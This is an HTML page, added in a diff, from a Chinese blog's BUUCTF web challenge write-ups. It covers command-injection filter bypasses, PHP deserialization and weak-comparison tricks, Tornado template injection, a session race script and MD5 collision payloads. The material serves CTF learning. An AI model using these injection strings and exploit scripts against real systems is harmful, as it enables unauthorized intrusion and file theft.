@@ -1,0 +1,1487 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="BUU题记">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>BUU - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="BUU">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-21 13:35" pubdate>
+        2021年10月21日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      120
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BUU</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 小时前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>BUU题记</p>
+<span id="more"></span>
+<hr>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><img src="/2021/10/21/BUU/pingpingping-1.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>1|ls
+//index.php flag.php
+</code></pre></div>
+<p>空格(space)过滤，$IFS$1 绕过 （$1改成$加其他数字貌似都行）</p>
+<div class="hljs code-wrapper"><pre><code>1|cat$IFS$1index.php
+</code></pre></div>
+<p><img src="/2021/10/21/BUU/pingpingping-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>ban了较多字符，并贪婪匹配flag，尝试变量拼接</p>
+<div class="hljs code-wrapper"><pre><code>1;a=g;cat$IFS$1fla$a.php
+//get flag
+
+//几种错误尝试
+//——*f*l*a*g*——正则匹配将其过滤，仅需改变顺序即可——
+1;a=fla;cat$IFS$9$ag.php
+1;a=f;b=l;c=a;d=g;cat$IFS$9$a$b$c$d.php
+</code></pre></div>
+<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 |</h2><p><img src="/2021/10/21/BUU/pingpingping-4.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>多命令执行符<br>; 执行完前面的语句再执行后面的语句<br>| 显示后面语句的执行结果<br>|| 当前面的语句执行出错时，执行后面的语句<br>&amp; 如果前面的语句为假则执行后面的语句，前面的语句可真可假<br>&amp;&amp; 如果前面的语句为假，则直接出错，也不执行后面的语句，前面的语句只能为真  </li>
+</ul>
+<h2 id="空格-space-过滤"><a href="#空格-space-过滤" class="headerlink" title="空格(space)过滤"></a>空格(space)过滤</h2><div class="hljs code-wrapper"><pre><code>&#123;cat,flag.txt&#125;
+$&#123;IFS&#125;
+$IFS$9
+&lt;
+&lt;&gt;
+%0a (换行)
+%0d（回车）
+%00
+%09
+%20
+</code></pre></div>
+<p>解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39808803/article/details/111341667">《dalao博客》：https://blog.csdn.net/weixin_39808803/article/details/111341667</a></p>
+<h2 id="过滤bash用sh执行"><a href="#过滤bash用sh执行" class="headerlink" title="过滤bash用sh执行"></a>过滤bash用sh执行</h2><div class="hljs code-wrapper"><pre><code>//官方payload
+/?ip=127.0.0.1;echo$IFS\$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+</code></pre></div>
+<h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><p>内联执行将反引号内命令的输出作为输入执行</p>
+<div class="hljs code-wrapper"><pre><code>/?ip=1;cat$IFS$1`ls`
+</code></pre></div>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>calc() CSS中的计算函数</p>
+<p><img src="/2021/10/21/BUU/EasyCalc-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看源码，一个前端过滤</p>
+<p><img src="/2021/10/21/BUU/EasyCalc-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问calc.php<br><img src="/2021/10/21/BUU/EasyCalc-3.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>//扫根目录---&gt;f1agg
+/calc.php/?num=var_dump(scandir(chr(47)))
+
+// /f1agg--&gt;chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)
+//get flag
+/calc.php/? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
+</code></pre></div>
+<h2 id="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"><a href="#前端过滤–变量名前加空格–PHP解析时先将变量的空格去除" class="headerlink" title="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"></a>前端过滤–变量名前加空格–PHP解析时先将变量的空格去除</h2><p>为什么要在num前加一个空格？</p>
+<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>PHP的字符串解析特性是什么？</p>
+<p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>【当waf不让你过的时候，php却可以让你过】</p>
+<h2 id="var-dump-scandir-读取根目录"><a href="#var-dump-scandir-读取根目录" class="headerlink" title="var_dump(scandir(\))读取根目录"></a>var_dump(scandir(\))读取根目录</h2><h2 id="file-get-contents-读文件"><a href="#file-get-contents-读文件" class="headerlink" title="file_get_contents()读文件"></a>file_get_contents()读文件</h2><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37865996/article/details/102529396">先上大佬博客：https://blog.csdn.net/qq_37865996/article/details/102529396</a></p>
+<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
+<p>…………………..</p>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="/2021/10/21/BUU/PHP-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>备份网站—&gt;<a target="_blank" rel="noopener" href="http://www.zip---&gt;下载源码/">www.zip---&gt;下载源码</a></p>
+<p>index.php</p>
+<p><img src="/2021/10/21/BUU/PHP-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>class.php</p>
+<p><img src="/2021/10/21/BUU/PHP-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>思路：  </p>
+<p>1.类销毁时，username=admin，password=100，输出flag</p>
+<p>2.$select= (实例化Name类-&gt;赋值-&gt;序列化-&gt;绕过_wakeup魔术方法)</p>
+<p>3.$select仅为一个字符串，$res相当于waf</p>
+<p>4.当$res销毁时，输出flag</p>
+<p>exp</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+class Name&#123;
+    private $username=&#39;admin&#39;;
+    private $password=&#39;100&#39;;
+&#125;
+$a=new Name();
+$b=serialize($a);    //修改变量个数，在每个类名和字段名前加%00
+print_r($b);
+
+//进行url编码，防止%00对应的不可打印字符在复制时丢失
+$c=urlencode(serialize($a));    //修改变量个数
+print_r($c);
+</code></pre></div>
+<h2 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h2><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p>
+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p>
+<p>public无标记，变量名不变，长度不变<br>protected在变量名前添加标记\00*\00，长度+3<br>private在变量名前添加标记\00(classname)\00，长度+2+类名长度</p>
+<h2 id="wakeup绕过方法"><a href="#wakeup绕过方法" class="headerlink" title="_wakeup绕过方法"></a>_wakeup绕过方法</h2><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 </p>
+<p> <big> 序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 </big> </p>
+<div class="hljs code-wrapper"><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;
+O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
+//将变量个数2-&gt;3
+O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;
+O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/11/03/php-wakeup/">贴上大佬博客：https://blog.spoock.com/2016/11/03/php-wakeup/</a></p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p><img src="/2021/10/21/BUU/BackupFile-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>get 备份文件—&gt; index.php.bak</p>
+<div class="hljs code-wrapper"><pre><code>&lt;?php
+include_once &quot;flag.php&quot;;
+
+if(isset($_GET[&#39;key&#39;])) &#123;
+    $key = $_GET[&#39;key&#39;];
+    if(!is_numeric($key)) &#123;     //需要绕过数字判断
+        exit(&quot;Just num!&quot;);
+    &#125;
+    $key = intval($key);        //获取整数值
+    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
+    if($key == $str) &#123;        //弱类型比较 将$str转换为int型再进行比较 =&gt; $str=123
+        echo $flag;
+    &#125;
+&#125;
+else &#123;
+    echo &quot;Try to find out source file!&quot;;
+&#125;
+</code></pre></div>
+<p>payload：</p>
+<div class="hljs code-wrapper"><pre><code>/?key=123
+</code></pre></div>
+<h2 id="常见备份文件泄露"><a href="#常见备份文件泄露" class="headerlink" title="常见备份文件泄露"></a>常见备份文件泄露</h2><div class="hljs code-wrapper"><pre><code>.rar .zip .7z .tar.gz .bak .swp .txt .html
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">备份文件参考泄露文献</a></p>
+<h2 id="PHP弱类型比较"><a href="#PHP弱类型比较" class="headerlink" title="PHP弱类型比较"></a>PHP弱类型比较</h2><p>//字符串与数字比较，转换为数字<br>//看字符串开头<br>//123admin–&gt;123<br>//admin123–&gt;0  </p>
+<p>///字符串以xex开头(x表示数字)，会被转换为科学计数法</p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>tornado—python框架</p>
+<p>简单了解了一下ssti原理，<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI链接</a><br><a target="_blank" rel="noopener" href="https://jiang-niao.github.io/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/#SSTi-%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%BE%85%E6%9B%B4%E6%96%B0%EF%BC%89">SSTi 学习</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结 </a><br>简单来说， 当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑</p>
+<p><img src="/2021/10/21/BUU/easy_tornado-2.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="/2021/10/21/BUU/easy_tornado-3.png" srcset="/img/loading.gif" lazyload>  </p>
+<p><img src="/2021/10/21/BUU/easy_tornado-1.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>flag in /fllllllllllllag  
+render  
+md5(cookie_secret+md5(filename))  
+
+flag在/fllllllllllllag  
+render--模板注入  
+filehash算法
+</code></pre></div>
+<p>思路：  </p>
+<ol>
+<li>寻找注入点  </li>
+<li>获取cookie_secret值  </li>
+<li>构造exp，get flag  </li>
+</ol>
+<div class="hljs code-wrapper"><pre><code>/file?filename=/flag.txt&amp;filehash=e50a4209e8ef4fa0a665b4dfbdc26e37
+
+只改filename，不改filehash---&gt;报错
+
+/error?msg=Error
+
+尝试确定模板注入点---&gt;回显3
+/error?msg=&#123;&#123;3&#125;&#125;
+
+查阅tornado文档（：并没有）
+[附上链接 ](https://tornado-zh.readthedocs.io/zh/latest/web.html) 
+获取cookie_secret值
+
+构造exp
+
+import hashlib
+hash = hashlib.md5()
+
+filename = &#39;/fllllllllllllag&#39;
+cookie_secret = &quot;4c12a8c3-8fe6-4182-b095-22e50cf34ac72&quot;
+hash.update(filename.encode(&#39;utf-8&#39;))
+s1 = hash.hexdigest()
+hash = hashlib.md5()
+hash.update((cookie_secret+s1).encode(&#39;utf-8&#39;))
+print(hash.hexdigest())
+</code></pre></div>
+<h2 id="render-函数进行服务器端渲染"><a href="#render-函数进行服务器端渲染" class="headerlink" title="render()函数进行服务器端渲染"></a>render()函数进行服务器端渲染</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengtingyan/article/details/83026387">render()函数服务器端渲染</a> </p>
+<h2 id="tornado—RequestHandler"><a href="#tornado—RequestHandler" class="headerlink" title="tornado—RequestHandler"></a>tornado—RequestHandler</h2><p><a target="_blank" rel="noopener" href="https://tornado-zh.readthedocs.io/zh/latest/web.html">tornado—RequestHandler类</a> </p>
+<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h5 id="第一遍做忘了审计源码…甚至没注意到标题…没一点思路"><a href="#第一遍做忘了审计源码…甚至没注意到标题…没一点思路" class="headerlink" title="第一遍做忘了审计源码…甚至没注意到标题…没一点思路:)"></a>第一遍做忘了审计源码…甚至没注意到标题…没一点思路:)</h5><p><img src="/2021/10/21/BUU/admin-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>界面：<br>login/register<br>index/post/change password/logout</p>
+<p>先</p>
+<ol>
+<li>登录/未登录的index<br><img src="/2021/10/21/BUU/admin-2.png" srcset="/img/loading.gif" lazyload></li>
+</ol>
+<p>提示需要admin登录，貌似admin登录成功拿flag</p>
+<ol start="2">
+<li>change password<br><img src="/2021/10/21/BUU/admin-3.png" srcset="/img/loading.gif" lazyload></li>
+</ol>
+<p>给出了题目源码</p>
+<h2 id="审计源码-！！！"><a href="#审计源码-！！！" class="headerlink" title="审计源码 ！！！"></a>审计源码 ！！！</h2><h2 id="正确打开方式：弱口令"><a href="#正确打开方式：弱口令" class="headerlink" title="正确打开方式：弱口令"></a>正确打开方式：弱口令</h2><p>username:admin<br>password:123</p>
+<p><img src="/2021/10/21/BUU/admin-4.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Unicode欺骗-nodeprep-prepare"><a href="#Unicode欺骗-nodeprep-prepare" class="headerlink" title="Unicode欺骗 nodeprep.prepare()"></a>Unicode欺骗 nodeprep.prepare()</h2><p>(规范标识符的常用方法是将所有内容都转换为小写)</p>
+<p>问题出在处理关键字符”username”上，处理”username”的函数是自定义的函数strlower()</p>
+<p><img src="/2021/10/21/BUU/admin-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>nodeprep.prepare()因版本差距过大，存在漏洞</p>
+<p>简单来说：<br>ᴀ -&gt; A -&gt; a<br>（未能找到相关文章…全部404了）</p>
+<p>具体编码可查 ：<a target="_blank" rel="noopener" href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> </p>
+<p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p>
+<h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>……</p>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：<br>我们注册一个用户test，现在有一个<br>进程1一直重复进行登录、改密码操作，<br>进程2一直注销，且以admin用户和进程1所改的密码进行登录，<br>是不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。</p>
+<p>（理论可行，未能打通）</p>
+<div class="hljs code-wrapper"><pre><code>import requests
+import threading
+
+def login(s, username, password):
+    data = &#123;
+        &#39;username&#39;: username,
+        &#39;password&#39;: password,
+        &#39;submit&#39;: &#39;&#39;
+    &#125;
+    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//login&quot;, data=data)
+
+def logout(s):
+    return s.get(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//logout&quot;)
+
+def change(s, newpassword):
+    data = &#123;
+        &#39;newpassword&#39;:newpassword
+    &#125;
+    return s.post(&quot;http://f48fd9d2-a071-4e9a-a39c-bf715bf7abad.node4.buuoj.cn:81//change&quot;, data=data)
+
+def func1(s):
+    login(s, &#39;skysec&#39;, &#39;skysec&#39;)
+    change(s, &#39;skysec&#39;)
+
+def func2(s):
+    logout(s)
+    res = login(s, &#39;admin&#39;, &#39;skysec&#39;)
+    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:
+        print(&#39;finish&#39;)
+
+def main():
+    for i in range(1000):
+        print(i)
+        s = requests.Session()
+        t1 = threading.Thread(target=func1, args=(s,))
+        t2 = threading.Thread(target=func2, args=(s,))
+        t1.start()
+        t2.start()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086">dailao三解</a> </p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164086#h3-7">一叶飘零大佬的一题三解</a> </p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="/2021/10/21/BUU/EasyMD5-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>检索源码，无有效信息，联想标题，sql md5—&gt;ffifdyop</p>
+<p><img src="/2021/10/21/BUU/EasyMD5-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>检索源码，得到一个md5的弱类型比较</p>
+<p><img src="/2021/10/21/BUU/EasyMD5-3.png" srcset="/img/loading.gif" lazyload></p>
+<div class="hljs code-wrapper"><pre><code>//弱类型比较，md5值只要为0e开头，就能绕过waf
+?a=QNKCDZO&amp;b=aabg7XSs
+
+//md5()无法处理数组，得到（000!=111&amp;&amp;error=error）
+?a[]=000&amp;b[]=111
+</code></pre></div>
+<p><img src="/2021/10/21/BUU/EasyMD5-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到md5强类型比较</p>
+<div class="hljs code-wrapper"><pre><code>//同样可以用上面的数组进行绕过
+param1[]=1&amp;param2[]=0
+
+//或者进行真实匹配，值不等，md5相等即可
+param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+</code></pre></div>
+<p>—&gt;得到flag</p>
+<h2 id="MD5比较"><a href="#MD5比较" class="headerlink" title="MD5比较"></a>MD5比较</h2><h3 id="1-弱类型比较"><a href="#1-弱类型比较" class="headerlink" title="1.弱类型比较"></a>1.弱类型比较</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) == md5($_POST[&#39;b&#39;]))
+</code></pre></div>
+<p>弱类型比较因为php特性，在比较时先将string转换为int型，0e开头会被识别为科学计数法，结果0=0 比较成功  </p>
+<p>payload：</p>
+<div class="hljs code-wrapper"><pre><code>a=QNKCDZO&amp;b=aabg7XSs
+</code></pre></div>
+<p>只要是md5值为0e开头即可</p>
+<h3 id="2-强类型比较"><a href="#2-强类型比较" class="headerlink" title="2.强类型比较"></a>2.强类型比较</h3><div class="hljs code-wrapper"><pre><code>if ($_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
+</code></pre></div>
+<p>强类型比较用数组绕过，md5()函数无法解出其数值，就会得到（0===0）强比较值相等</p>
+<p>payload：</p>
+<div class="hljs code-wrapper"><pre><code>a[]=111&amp;b[]=aaa
+</code></pre></div>
+<p>传入数组即可</p>
+<h3 id="3-真实碰撞"><a href="#3-真实碰撞" class="headerlink" title="3.真实碰撞"></a>3.真实碰撞</h3><div class="hljs code-wrapper"><pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
+</code></pre></div>
+<p>真实md5碰撞，由于string()函数，不能输入数组只能输入字符串</p>
+<p>payload：</p>
